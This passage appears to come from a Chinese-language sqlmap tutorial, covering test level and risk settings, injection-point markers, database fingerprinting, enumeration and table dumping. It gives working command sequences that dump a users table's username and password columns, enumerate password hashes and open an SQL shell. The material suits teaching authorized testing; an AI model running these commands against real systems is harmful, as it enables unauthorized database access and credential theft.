<h3 id="41-检测级别">4.1 检测级别<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#41-检测级别" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--level</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">LEVEL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 测试级别(1-5，默认1)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  1:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 默认级别，仅测试GET和POST参数</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  2:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 增加HTTP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Cookie测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  3:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 增加HTTP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> User-Agent和Referer测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  4:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 测试更多HTTP头（如X-Forwarded-For）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  5:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 测试HTTP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Host头</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--level</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">3</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 测试Cookie、UA、Referer</span></span></code></pre></figure>
<h3 id="42-风险等级">4.2 风险等级<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#42-风险等级" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--risk</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">RISK</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 风险级别(1-3，默认1)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  1:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 默认安全级别</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  2:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 增加基于时间的盲注测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  3:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 增加OR-based注入测试（可能导致数据修改）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 警告：risk=3 可能影响数据库数据</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--risk</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">2</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 推荐使用</span></span></code></pre></figure>
<h3 id="43-检测选项">4.3 检测选项<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#43-检测选项" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--string</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">STRING</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 页面真值条件的匹配字符串</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --string=&quot;Welcome&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--not-string</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">NOT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 页面假值条件的匹配字符串</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--regexp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REGEXP</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 页面真值条件的正则表达式</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--code</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CODE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 页面真值条件的HTTP状态码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --code=200</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--text-only</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 仅比较文本内容（忽略HTML标签）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--titles</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 仅比较页面标题</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 动态内容检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--smart</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 启用智能检测（减少误报）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--mobile</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 模拟移动设备</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--page-rank</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 使用Google页面排名</span></span></code></pre></figure>
<h3 id="44-注入点标记">4.4 注入点标记<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#44-注入点标记" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在URL或POST数据中使用星号(*)标记注入点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php?id=1*&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;username=admin*&amp;password=123&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 这样可以精确指定测试位置</span></span></code></pre></figure>
<h2 id="五指纹识别与枚举">五、指纹识别与枚举<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#五指纹识别与枚举" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="51-指纹识别">5.1 指纹识别<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#51-指纹识别" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-f,</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --fingerprint</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 详细的数据库指纹识别</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-a,</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --all</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 获取所有可能的信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-b,</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --banner</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 获取数据库版本banner</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--current-user</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 获取当前数据库用户</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--current-db</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 获取当前数据库名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--hostname</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 获取服务器主机名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--is-dba</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 检测当前用户是否为DBA</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--users</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 枚举所有数据库用户</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--passwords</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 枚举用户密码哈希值</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--privileges</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 枚举用户权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--roles</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 枚举用户角色</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整信息收集示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -b</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --current-user</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --current-db</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --is-dba</span></span></code></pre></figure>
<h3 id="52-数据库枚举">5.2 数据库枚举<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#52-数据库枚举" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--dbs</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                          # 枚举所有数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--tables</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 枚举指定数据库的表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--columns</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 枚举指定表的列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--schema</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 枚举完整数据库架构</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--count</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 获取表中的数据条数</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--dump</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                         # 导出表数据</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--dump-all</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 导出所有数据库的所有表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--search</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                       # 搜索列、表或数据库</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DB</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                          # 指定数据库名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TBL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                         # 指定表名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> COL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                         # 指定列名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-X</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> EXCLUDE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 排除指定列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-U</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> USER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 指定用户名</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整枚举流程示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbs</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 1.列出所有数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tables</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # 2.列出testdb的所有表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --columns</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 3.列出users表的列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">     # 4.导出users表数据</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> username,password</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 5.只导出指定列</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 搜索敏感信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--search</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> password</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 搜索包含password的列</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--search</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> user</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 搜索包含user的表</span></span></code></pre></figure>
<h3 id="53-数据检索">5.3 数据检索<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#53-数据检索" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--start</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">LIMITSTART</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 从第N条记录开始</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--stop</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">LIMITSTOP</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 到第N条记录结束</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--first</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">FIRSTCHAR</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 从第N个字符开始检索</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--last</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">LASTCHAR</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 到第N个字符结束检索</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例：只获取前10条记录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--start</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --stop</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">10</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--sql-query</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">QUERY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 执行自定义SQL语句</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --sql-query=&quot;SELECT version()&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--sql-shell</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 进入交互式SQL Shell</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--sql-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SQLFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 执行SQL文件中的语句</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># SQL Shell 使用示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --sql-shell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sql</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">> </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SELECT</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> @@version</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sql</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">> </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SELECT</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> *</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> FROM</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LIMIT</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span></code></pre></figure>
<h3 id="54-数据导出选项">5.4 数据导出选项<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#54-数据导出选项" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dump-format</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">FORMAT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 导出格式(CSV, HTML, SQLITE)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--dump-table</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 导出整表（不需要列名）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--exclude-sysdbs</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 排除系统数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;col1,col2&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 指定要导出的列</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--where</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;condition&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 添加WHERE条件</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --where=&quot;id>100&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 导出到CSV</span></span>
